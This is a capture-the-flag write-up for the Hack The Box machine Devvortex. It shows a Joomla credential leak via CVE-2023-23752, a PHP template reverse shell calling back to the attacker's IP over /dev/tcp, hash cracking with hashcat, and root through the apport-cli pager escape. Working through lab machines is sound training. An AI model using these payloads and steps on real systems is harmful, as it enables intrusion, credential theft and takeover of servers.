---
title: Hack The Box | Devvortex Writeup  
date: 2024-02-01 23:00:00 +0530
categories: [Blogging, Writeup, Hack The Box]
tags: [Devvortex, HTB, Writeup] 
pin: false
math: true
mermaid: true
author: 7h3h0und
image:
  path: /assets/img/headers/devvortex.png
  lqip: data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAYAAAB3AH1ZAAADIklEQVR4nJWVS24rVRCGvzqPftiOQyLgiuiCQLoSO2ALbIEJA5aGmLEMxncGO2BEcqXEjuPuPo8qBm0njpBIUlK3dAZd/ddXf52Si6++N94Q4sAUhntFFfqVo+mh6YQoC7xrADs8/w1VfXYOb/15Ho3YeH74ccW7byKxg7ubyp9/jAz3hf5MURVAkJNvDRCgvlmAgY/C+iKyWnWEGAlNgOy5/TsCUGvh6w89NSu1KNOY2W0KORkixzQHIkdVMud+UYABsYXYOkKMxCawWAfWFw3LRYMZjEPifqvsNoYThwvgoqKjzS0z5pc8Ja1WXkFAAIXQCM4LPjpCH1h/seT8fEnXrDCD2O+xZsOY9mQqFMM3oGbIox3smS1EBHsVAYMQBXHzOcaWzy8v6NszRM9RE0K7JQRhc6OkYQdixChgj6RnCscOyAGIvMGEhlFqpWsbzpc9XdOhJaKAk45sC677PbvNDsThPHgPzp8W/4SgZn0FgYPKWqDkSpK5bw8PA6kmUrmjmtF5I6eMGUy5ME0Zq3MLZgqnzpsTN3428MsEBMpk+KjUOrHdTlxfT6w/a5EgmMB2X7jfTGzuE/thQmuF5B95iwhykHFkENvwSgEYaVJ86xCX2e92fLo2xqHHh3YWWBIPu5HhYaSWiqhQ0rFuQQ3c4zjOUUrFsP8X4JzDudmtmoTYCzUlyhjRpqH3c11aFMuZkkZQI42g2XDe4ZxDRHCnMzhzwewFAW3b0jaREAJt27Bat7QLR2jmOU+6m/EGpV9GzJYEWTCEQkmVqhVTo5b61P5DIx7S9LKA5vDzEALeeYLr0cmoqmSDLIZZRRVqhTx6ggS6plB9IecCBqMO8OiB+VJetC3CKzwwTYlhGDEzUs6Py0ScYTaLCdHjnFCq4sSTUp4rFWhjg8K8wU4i+leYcLPZIgK//PwTd5t7rq7ecXe3petabm/vuLy4oMrA2XnHx49/cbn+kvfvr/jn5hMfvvuWX3/7nTRNxONlcBLH3SAvrWMzw3tPzpmUMjFGSimICFWV5aIj9BUfBM2O/a5gGOvVGeuzFaXWZ+MHJ3ZA+BcNsqz461PEEQAAAABJRU5ErkJggg==
---

The Machine IP address (victim) : 10.129.229.146

added it as part of the hosts file by 

``` bash
echo "10.129.229.146    devvorotex.htb" >> /etc/hosts
```

## Enumeration: 

### Port Scan:

As always my first approch is to run an nmap scan to see types of services enabled. 

``` bash
# Nmap 7.94SVN scan initiated Thu Feb  1 21:21:26 2024 as: nmap -sV -A -T5 -oA 10.129.229.146 10.129.229.146
Nmap scan report for 10.129.229.146
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb  1 21:21:55 2024 -- 1 IP address (1 host up) scanned in 29.15 seconds
```
Nothing much here just port 80 with NGINX and SSH on default 22, i will settele with my scan for now and will initiate another one if needed later on.

### Directory Enumeration: 

I stared ffuf to fuzz out any subdomains as below.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" -mc 200
```

![img-description](/assets/img/htb/devvortex/1.png) _FUZZING for Subdomains_

Found dev.devvoertex.htb and have added it to my /etc/hosts and proceeded to explore the site.

Meanwhile, I ran ffuf again to see if we have any hidden web content.

``` bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://dev.devvortex.htb/FUZZ
```
![img-description](/assets/img/htb/devvortex/2.png) _Reveling hidden web content_

I went ahead and pivoted to administrator page and notices its using joomla CMS.

![img-description](/assets/img/htb/devvortex/3.png) _Joomla CMS_

### Initial Step:

With a quick google search, I could learn that there is a code execution vulnerability [CVE-2023-23752](https://vulncheck.com/blog/joomla-for-rce).

The Joomla versions 4.0.0 through 4.2.7 are affected with improper access check vulnerability. Allowing us to leak MySQL database credentials.

```bash
curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
```

![img-description](/assets/img/htb/devvortex/4.png) _exploiting the vulnerablity_

Leveraging the vulnerability, I was able to retrieve the credentials for Joomla Administrator.

![img-description](/assets/img/htb/devvortex/5.png) _Admin Access_

I know that we can modify PHP templates in such CMS and can gain reverse shell. Lets try !

So, I went ahead to `System -> Templates -> Administrator Templates -> Atum -> login.php` and added my payload and saved the template.

![img-description](/assets/img/htb/devvortex/6.png) _PHP reverse shell_

Payload used for reverse shell.
```bash
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.81/4444 0>&1'")
```
Stared netcat listener on my host machine and browsed to login.php

```bash
nc -lvnp 4444
```

![img-description](/assets/img/htb/devvortex/7.png) _PHP reverse shell_

I received the shell but seems like needing to stabalize it.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

stty raw -echo; fg

#Press Enter twice, and type the command 
export TERM=xterm 

```
> While you enter `ctrl-z` you will see a session suspended message. no worries it just backgrounds the terminal, and you will regain the session once you enter `fg` and the view will be fixed with `export TERM=xterm`
{: .prompt-info }

### Privilege Escalation:

#### To User Access:

With our initial exploit we were able to leal MySQl DB credentials. With out wasting time I went ahead and tried logging in to MySQL

```bash
mysql -u lewis -p
```

Reviewing the database `joomla` I was able to retrive the user credential user logan from table `sd4fg_users`

![img-description](/assets/img/htb/devvortex/8.png) _Db user table dump_

The password is hashed with 'bcrypt' hashing mechanism, so I went ahead and saved hash in a text file and ran `hashcat`.

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/worlist/rockyou.txt
```
![img-description](/assets/img/htb/devvortex/9.png) _hashcat_

The password was cracked in an instant, so I SSHed into the box with the cracked credentials.

We own the `USER` of this Machine.

#### From User to Root:

The first thing i do is to check the users sudo privileges:

```bash
sudo -l
```

With which, I learned  that I (now the user) can run `apport-cli`  with root privileges.

![img-description](/assets/img/htb/devvortex/10.png) _approt-cli_

I simply googled to get more understanding and found out privilege escalation vulnerability [CVE-2023-1326](https://github.com/diego-tella/CVE-2023-1326-PoC) in apport-cli, that could alow me to pivot to root.

The version on this machine is older and is vulnerable. Hence, I went ahead and ran the command `sudo /usr/bin/apport-cli` to see the options and if i can populate the report as mentioned in POC. 

```bash
logan@devvortex:~$ sudo /usr/bin/apport-cli --help
Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]

Options:
  -h, --help            show this help message and exit
  -f, --file-bug        Start in bug filing mode. Requires --package and an
                        optional --pid, or just a --pid. If neither is given,
                        display a list of known symptoms. (Implied if a single
                        argument is given.)
  -w, --window          Click a window as a target for filing a problem
                        report.
  -u UPDATE_REPORT, --update-bug=UPDATE_REPORT
                        Start in bug updating mode. Can take an optional
                        --package.
  -s SYMPTOM, --symptom=SYMPTOM
                        File a bug report about a symptom. (Implied if symptom
                        name is given as only argument.)
  -p PACKAGE, --package=PACKAGE
                        Specify package name in --file-bug mode. This is
                        optional if a --pid is specified. (Implied if package
                        name is given as only argument.)
  -P PID, --pid=PID     Specify a running program in --file-bug mode. If this
                        is specified, the bug report will contain more
                        information.  (Implied if pid is given as only
                        argument.)
  --hanging             The provided pid is a hanging application.
  -c PATH, --crash-file=PATH
                        Report the crash from given .apport or .crash file
                        instead of the pending ones in /var/crash. (Implied if
                        file is given as only argument.)
  --save=PATH           In bug filing mode, save the collected information
                        into a file instead of reporting it. This file can
                        then be reported later on from a different machine.
  --tag=TAG             Add an extra tag to the report. Can be specified
                        multiple times.
  -v, --version         Print the Apport version number.
```
With the `-f` option i will able to file a bug report on below choices.

```bash
logan@devvortex:~$ sudo /usr/bin/apport-cli -f

*** What kind of problem do you want to report?

Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C): 1

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

*** What display problem do you observe?

Choices:
  1: I don't know
  2: Freezes or hangs during boot or usage
  3: Crashes or restarts back to login screen
  4: Resolution is incorrect
  5: Shows screen corruption
  6: Performance is worse than expected
  7: Fonts are the wrong size
  8: Other display-related problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/C): 2

*** 

To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze

Press any key to continue... 
```

Following through the choices, I was able to generate a report that leads to its pager and escalate my self with calling `/bin/bash`.

``` bash
..dpkg-query: no packages found matching xorg
..............

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v
```

![img-description](/assets/img/htb/devvortex/11.png) _exploiting the vulnerability_

> `Vulnerability`: Less is configured as the pager in apport-cli allowing us to set: the terminal size.
{: .prompt-info }

Once I hit the enter key after typing the command `!/bin/bash` the pager closed leaving a escalated shell to root. 

![img-description](/assets/img/htb/devvortex/12.png) _whoami - Root!_

We have the machine `ROOTED!`  

